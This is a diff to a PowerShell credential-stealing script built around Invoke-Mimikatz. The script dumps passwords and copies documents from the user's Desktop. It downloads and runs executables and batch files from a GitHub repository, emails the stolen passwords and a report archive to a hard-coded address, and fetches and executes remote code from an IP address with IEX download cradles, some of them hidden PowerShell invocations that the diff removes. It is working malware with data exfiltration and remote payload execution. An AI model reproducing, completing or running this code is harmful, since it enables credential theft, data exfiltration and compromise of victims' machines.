@@ -1,3 +1,5 @@
+$githuburl = 'https://github.com/begiilm/dy/raw/master/'
+$connectip = '106.80.36.165'
 function Invoke-Mimikatz
 {
 <#
@@ -2742,10 +2744,11 @@ $fileSaveDir = New-Item  ($userDir) -ItemType Directory
 Invoke-Mimikatz -Dumpcreds >> $fileSaveDir'/DumpPass.txt'
 
 $copyDir = (Get-ChildItem env:\userprofile).value + '\Desktop'
-$huida = (Get-ChildItem env:\username).value + ' Getpass.txt'
-$huida1 = (Get-ChildItem env:\username).value + ' Report.zip'
+
 $copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
-IEX (New-Object Net.WebClient).DownloadString('http://106.80.58.193:8080/')
+
+
+IEX (New-Object Net.WebClient).DownloadString('http://' + $connectip + '/:8080/')
 
 Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
@@ -2753,20 +2756,21 @@ Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $co
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.zip -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
-$huifu1 = (Get-ChildItem env:\username).value + ' GetPass.txt'
-$huifu2 = (Get-ChildItem env:\username).value + ' Report.zip'
 
-(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/Get.rar','D:\Get.exe');
-(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run.rar','D:\run.bat');
+$object1 = (Get-ChildItem env:\username).value + ' GetPass.txt'
+$object2 = (Get-ChildItem env:\username).value + ' Report.zip'
+
+(new-object System.Net.WebClient).DownloadFile($githuburl + '/Get.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile($githuburl + '/run.rar','D:\run.bat');
 d:\run.bat
 $mail = New-Object System.Net.Mail.MailMessage
 #set the addresses
 $mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
 $mail.To.Add('2014652020@email.ctbu.edu.cn')
 #set the content
-$mail.Subject = $huida
+$mail.Subject = $object1
 $mail.Priority  = 'High'
-$mail.Body = 'test'
+$mail.Body = 'Chrome  password'
 $filename= 'D:\GetPass.txt'
 $attachment = new-Object System.Net.Mail.Attachment($filename)
 $mail.Attachments.Add($attachment)
@@ -2785,8 +2789,8 @@ catch
 }
 remove-item 'D:\GetPass.txt'
 remove-item 'D:\Get.exe'
-#(new-object System.Net.WebClient).DownloadFile('http://wpbkt.oss-cn-hangzhou.aliyuncs.com/GetPass.ps1','D:\GetPass.ps1');
-#D:\GetPass.ps1;
+
+
 $date = get-date
 
 $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
@@ -2941,9 +2945,9 @@ $mail = New-Object System.Net.Mail.MailMessage
 $mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
 $mail.To.Add('2014652020@email.ctbu.edu.cn')
 #set the content
-$mail.Subject = $huida1
+$mail.Subject = $object2
 $mail.Priority  = 'High'
-$mail.Body = 'test'
+$mail.Body = 'Report file'
 $filename= 'D:\Report.zip'
 $attachment = new-Object System.Net.Mail.Attachment($filename)
 $mail.Attachments.Add($attachment)
@@ -2960,11 +2964,9 @@ catch
 {
 	echo 'Error!Filed!'
 }
-powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://106.80.58.193:8080/'))
-powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://106.80.58.193:8080/'))
-powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://106.80.58.193:8080/'))
-IEX (New-Object Net.WebClient).DownloadString('http://106.80.58.193:8080/')
-IEX (New-Object Net.WebClient).DownloadString('http://106.80.58.193:8080/')
+
+
 remove-item $fileSaveDir -recurse
-(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run2.rar','D:\run2.bat');
+(new-object System.Net.WebClient).DownloadFile($githuburl + '/run2.rar','D:\run2.bat');
 d:\run2.bat
+
